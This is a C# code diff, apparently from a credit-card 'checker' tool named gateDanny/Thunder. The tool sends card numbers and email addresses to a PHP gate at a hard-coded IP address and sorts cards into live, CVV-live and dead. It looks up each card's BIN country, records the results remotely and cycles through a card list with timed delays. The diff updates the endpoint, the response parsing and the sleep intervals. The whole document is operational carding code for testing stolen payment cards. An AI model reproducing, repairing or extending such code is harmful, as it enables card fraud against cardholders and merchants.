@@ -108,7 +108,7 @@ namespace gateDanny.gates
                     Thunder._Form1.update_progresbar(5);
                     var cc = Thunder._Form1.nextCc().Trim();
 
-                    var client = new RestClient("http://3.12.239.104/thu/check.php?correo=" + correo+"&cc="+Thunder._Form1.nextCc().Trim());
+                    var client = new RestClient("http://3.12.239.104/thu/try1.php?correo=" + correo+"&cc="+Thunder._Form1.nextCc().Trim());
                     //var client = new RestClient("http://3.12.239.104/thu/checkv2.php?correo=" + correo+"&cc="+Thunder._Form1.nextCc().Trim());
                     client.Timeout = -1;
                     var request = new RestRequest(Method.GET);
@@ -116,12 +116,12 @@ namespace gateDanny.gates
                     Console.WriteLine(response.Content);
 
                     dynamic resp = JsonConvert.DeserializeObject(response.Content);
-                    string code = resp.code;
+                    bool code = resp.success;
+                    string error = resp.error;
 
-                    if(code == null)
+                    if (code == true || code.ToString() == "true")
                     {
-                        if (resp.id != "" && resp.id != null)
-                        {
+                        
                             Thunder._Form1.update_progresbar(100);
                             var pais = checkbin(cc.Substring(0, 6));
                             var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
@@ -132,13 +132,13 @@ namespace gateDanny.gates
                             Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
-                            Thread.Sleep(10000);
+                            Thread.Sleep(15000);
                             pago();
-                        }
+                        
                     }
                     else
                     {
-                        if (code.Contains("cvc") || code.Contains("code"))
+                        if (error.Contains("cvc") || error.Contains("code") || error.Contains("cvv"))
                         {
                             Thunder._Form1.agrgar_live_cvv("(cvv) - ");
                             Thunder._Form1.update_progresbar(100);
@@ -151,24 +151,8 @@ namespace gateDanny.gates
                             Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
-                            Thread.Sleep(10000);
+                            Thread.Sleep(15000);
                             pago();
-                        }
-                        else if (resp.error == "fraudulent" || resp.code != "")
-                        {
-                            var pais = checkbin(cc.Substring(0, 6));
-                            Thunder._Form1.update_progresbar(100);
-                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
-                            check.ccss(Variables.key, guardar, "deads");
-                            Thread.Sleep(300);
-                            Thunder._Form1.agragar_dead(cc);
-                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Thunder._Form1.remove_cc(0, cc.Length);
-                            numeroTargeta++;
-                            pagos++;
-                            Thread.Sleep(10000);
-                            pago();
-
                         }
 
                         else
@@ -183,7 +167,7 @@ namespace gateDanny.gates
                             Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
-                            Thread.Sleep(10000);
+                            Thread.Sleep(15000);
                             pago();
                         }
                     }
